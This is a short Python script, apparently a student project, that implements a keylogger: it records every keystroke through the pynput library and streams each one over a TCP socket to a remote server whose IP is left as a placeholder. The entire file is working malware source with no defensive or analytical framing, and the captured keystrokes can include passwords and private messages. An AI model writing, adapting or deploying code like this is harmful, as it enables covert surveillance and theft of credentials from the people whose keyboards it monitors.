#! /usr/bin/env python3
# Matthew Faulkner
# mjf9309@rit.edu

import socket

from pynput.keyboard import Key, Listener

# configure the server
SERVER_IP = "REPLACE"  # Replace with host machine's IP
SERVER_PORT = 10022

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, SERVER_PORT))


def on_press(key):
    try:
        client_socket.send(str(key.char).encode())
    except AttributeError:
        # Special keys
        client_socket.send(str(key).encode())


def on_release(key):
    if key == Key.esc:
        # Close connection and stop the listener
        client_socket.close()
        return False


# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
